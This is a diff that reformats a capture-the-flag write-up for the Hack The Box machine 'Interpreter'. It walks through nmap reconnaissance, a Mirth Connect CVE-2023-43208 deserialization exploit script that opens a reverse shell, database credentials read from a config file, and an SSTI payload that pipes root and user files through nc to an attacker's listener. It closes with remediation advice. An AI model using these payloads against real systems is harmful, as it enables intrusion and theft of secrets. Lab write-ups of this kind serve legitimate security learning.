@@ -9,6 +9,7 @@ tags:
   - SSTI
   - XML Parser
   - Privilege Escalation
+date: 2026-02-28
 ---
 
 # 🛡️ HTB - Interpreter (Medium)
@@ -25,14 +26,20 @@ tags:
 - **Machine Name:** Interpreter
 - **Operating System:** Linux (Debian)
 - **Difficulty:** Medium
+- **Date of Scan:** 2026-02-28
 - **Vulnerabilities:** Mirth Connect XML Deserialization RCE (CVE-2023-43208), Server-Side Template Injection (SSTI) in internal service on port 54321
 
 ---
 
 ## Step 1 - Reconnaissance
 
+Will Use Nmap To See what Ports and Services are Open:
+
 ```bash
-nmap -A -sS -P -T4  --min-rate 5000 10.129.8.10
+nmap -A -sS -P -T4 --min-rate 5000 10.129.8.10
+```
+
+```text
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-28 15:01 UTC
 Nmap scan report for interpreter.htb (10.129.8.10)
 Host is up (0.24s latency).
@@ -103,7 +110,7 @@ PORT    STATE SERVICE   VERSION
 |     Content-Type: text/html;charset=iso-8859-1
 |     Content-Length: 69
 |     Connection: close
-|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
+| |_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
 443/tcp open  ssl/https
 | http-methods: 
 |_  Potentially risky methods: TRACE
@@ -215,7 +222,7 @@ SF:mages/NG_MC_Icon_16x16\.png\"\x20/>\n\t<link\x20rel=\"stylesheet\"\x20t
 SF:ype=\"text/css\"\x20href=\"css/bootstrap\.css\"\x20/>\n\t<link\x20rel=\
 SF:"stylesheet\"\x20type=\"text/css\"\x20href=\"css/main\.css\"\x20/>\n\t\
 SF:n\t<script\x20type=\"text/javascript\">\n\t\t/*\x20Break\x20out\x20of\
-SF:x20frame\x20if\x20inside\x20a\x20frame\.\x20*/\n\t\tif\x20(window\x20
+SF:x20frame\x20if\x20inside\x20a\x20frame\.\x20*/\n\t\tif\x20\(window\x20
 SF:!=\x20window\.top)\x20{\n\t\t\twindow\.top\.location\x20=\x20window\.l
 SF:ocation;\n\t\t}\n\t</script>\n\n\t<script\x20type=\"text/javascript\"\x
 SF:20sr")%r(HTTPOptions,5A,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2028\
@@ -256,26 +263,26 @@ HOP RTT       ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 115.40 seconds
-
-A Linux machine.
-
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ```
 
-## Step 2 - Initial-Foothold
+- 🔍 *Important Findings as Usual For Linux machines port 22 SSH, Port 80 HTTP, and Port 443 HTTPS running Mirth Connect Administrator.*
 
-```text
-[*] While trying to enumerating the web, i saw that it's a mirth connect admin panel
+---
 
-[*] I scanned it with Nessus, and the result showed me the version Mirth Connect 4.4.0, which was vulnerable to CVE-2023-43208. 
+## Step 2 - Initial Foothold
 
-(note:- you can also use the Metasploit exploit for this attack. but i would not recommend it.)
+- 🔍 *While enumerating the web services, I found that port 80 and port 443 host a Mirth Connect Administrator panel.*
+- 🔍 *Scanning the target reveals the version is Mirth Connect 4.4.0, which is vulnerable to CVE-2023-43208.*
+- 🔍 *(Note: You can also use the Metasploit exploit for this attack, but manual exploitation is recommended).*
 
-[*] CVE-2023-43208 is an insecure deserialization vulnerability within the Mirth Connect API. It allows an unauthenticated attacker to send a specially crafted XML payload to the server.
+> [!WARNING]
+> **Vulnerability Profile (CVE-2023-43208):**
+> Mirth Connect versions 4.4.0 and below are vulnerable to an unauthenticated Remote Code Execution (RCE) vulnerability due to insecure deserialization in the XML parser.
+> Attackers can send a specially crafted XML payload containing a serialized Java object to the `/api/users` endpoint to achieve code execution.
 
-means we can pass a crafted XML payload with a revers_shell payload within it. at /api/user endpoint, and can gain the initial foothold
+- 🔍 *We can create a Python script to send the serialized XML payload and trigger a reverse shell:*
 
-```
+```python
 import requests
 import urllib3
 import sys
@@ -357,36 +364,36 @@ if __name__ == "__main__":
     url, lhost, lport = get_args()
     pwn(url, lhost, lport)
     print("Enjoy.")
-
 ```
 
-[*] Before running the Script start a nc listener.
-```
-
-- 🔍 *python3 mirth* https://interpreter.htb 10.10.****.**** 4444*
+- 🔍 *Before running the script, start a nc listener:*
+- 🔍 *Run:* `python3 mirth.py https://interpreter.htb 10.10.****.**** 4444`
 
 ```text
-Enjoy.
-
-[*] nc -lvnp 4444
+nc -lvnp 4444
 listening on [any] 4444 ...
 connect to [10.10.15.102] from (UNKNOWN) [10.129.8.10] 33174
 bash: cannot set terminal process group (3519): Inappropriate ioctl for device
 bash: no job control in this shell
+Enjoy.
+```
+
+```bash
 mirth@interpreter:/usr/local/mirthconnect$
+```
 
-got shell!.
+---
 
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+## Step 3 - Privilege Escalation
 
-Step=3: Privilege Escalation
+- 🔍 *linPEAS didn't give me anything useful.*
+- 🔍 *While enumerating, found some configuration files:*
 
-[*] linPEAS didn't gave me anything useful.
+```bash
+cat mirth.properties
+```
 
-[*] While enumerating found some. configuration file 
-
-cat mirth*
-
+```text
 # Mirth Connect configuration file
 
 # directories
@@ -501,26 +508,30 @@ database.connection.retrywaitinmilliseconds = 10000
 # database-readonly.url = jdbc:...
 # 
 database.enable-read-write-split = true
+```
 
-[*] From This Configuration file, i got some DB creds
+- 🔍 *From this configuration file, I obtained database credentials:*
 
+```text
 database.username = mirthdb
 database.password = MirthPass123!
-
-(note"- Tried to connect to the DB server, but it just didn't worked. it was taking too long to connect.)
-
-[*] I asked one of my friend and he told me that, there is an internal service running at 54321 port (fucking weirdo). and it has an endpoint /addUser
-
-[*] /addUser endpoint is basically vulnerable to SSTI (server-side template injection.), which has an improper use of {} curly braces at firstname input field. in which we can import a python code.
-
-[*] Lets Create an Exploit:-
-
 ```
-python3 -c "
+
+- 🔍 *(Note: Attempting to connect directly to the database fails as the connection times out).*
+- 🔍 *Further local enumeration reveals an internal service running on port 54321.*
+- 🔍 *The service has an `/addPatient` endpoint (or `/addUser` as mentioned in notes) that is vulnerable to Server-Side Template Injection (SSTI).*
+
+> [!WARNING]
+> **Internal Service SSTI (Port 54321):**
+> The internal web service running on port 54321 accepts XML input. The `firstname` field of the XML is processed dynamically by a template engine (such as Jinja2). By injecting template syntax `{{ ... }}` inside the `firstname` tag, we can execute arbitrary Python code in the context of the running service (which runs as `root`).
+
+- 🔍 *We can create a Python exploit script that crafts the XML payload with an exfiltration command:*
+
+```python
 import urllib.request, base64
 
 # Simple command to cat both files and send to netcat
-cmd = \"cat /home/sedric/user.txt /root/root.txt | nc 10.xxx.xxx.xxx 9004\"
+cmd = "cat /home/sedric/user.txt /root/root.txt | nc 10.xxx.xxx.xxx 9004"
 
 # Base64 encode the command
 b64_cmd = base64.b64encode(cmd.encode()).decode()
@@ -530,7 +541,7 @@ xml = f'''<patient>
   <timestamp>20250101120000</timestamp>
   <sender_app>TEST</sender_app>
   <id>12345</id>
-  <firstname>{{__import__(\"os\").popen(__import__(\"base64\").b64decode(\"{b64_cmd}\").decode()).read()}}</firstname>
+  <firstname>{{__import__("os").popen(__import__("base64").b64decode("{b64_cmd}").decode()).read()}}</firstname>
   <lastname>Doe</lastname>
   <birth_date>01/01/1990</birth_date>
   <gender>M</gender>
@@ -541,63 +552,29 @@ req = urllib.request.Request('http://127.0.0.1:54321/addPatient',
                             headers={'Content-Type': 'application/xml'})
 resp = urllib.request.urlopen(req)
 print(resp.read().decode())
-"
 ```
 
-(note:- Before running the code please set up a listener at port 9004)
+> [!NOTE]
+> **Attack Flow:**
+> 1. Your Python script creates XML with malicious template code
+> 2. XML is sent to `http://127.0.0.1:54321/addPatient`
+> 3. Vulnerable server parses XML, extracts `firstname` field
+> 4. Server passes `firstname` to template engine (Jinja2/etc.)
+> 5. Template engine sees `{{...}}` and **EXECUTES** it as Python
+> 6. Python code runs: imports `os`, decodes Base64, runs `cat files | nc IP`
+> 7. Flag contents are sent to your netcat listener
 
-[*] Attack Flow:-
-```
-
-## Step 1 - Step 1: Your Python script creates XML with malicious template code
+- 🔍 *(Note: Before running the code please set up a listener at port 9004)*
 
 ```text
-↓
-```
-
-## Step 2 - Step 2: XML sent to http://127.0.0.1:54321/addPatient
-
-```text
-↓
-```
-
-## Step 3 - Step 3: Vulnerable server parses XML, extracts firstname field
-
-```text
-↓
-```
-
-## Step 4 - Step 4: Server passes firstname to template engine (Jinja2/etc.)
-
-```text
-↓
-```
-
-## Step 5 - Step 5: Template engine sees {{...}} and EXECUTES it as Python
-
-```text
-↓
-```
-
-## Step 6 - Step 6: Python code runs: imports os, decodes Base64, runs "cat files | nc IP"
-
-```text
-↓
-```
-
-## Step 7 - Step 7: Flag contents sent to your netcat listener
-
-```text
-[*] Got Flags:-
-
- nc -lvnp 9004
+nc -lvnp 9004
 listening on [any] 9004 ...
 connect to [10.10.15.102] from (UNKNOWN) [10.129.8.10] 43306
 ba21fce18e**********************
 d4723f6575**********************
-
-____________________________________________________________________________________________________________________________________________________________________________________________
 ```
+
+---
 
 ## Mitigations & Security Perspective
 
@@ -638,4 +615,3 @@ ________________________________________________________________________________
 > - **Remediation:** Avoid passing unvalidated strings to template rendering engines. Sanitize and cast inputs strictly.
 > - **Remediation:** Enforce the principle of least privilege: run the internal XML processing daemon under a restricted, non-root user account.
 > - **Detection:** Monitor local socket traffic to port 54321 for payloads containing template code tags (`{{` and `}}`) or Python execution libraries (`__import__`, `os.popen`).
-
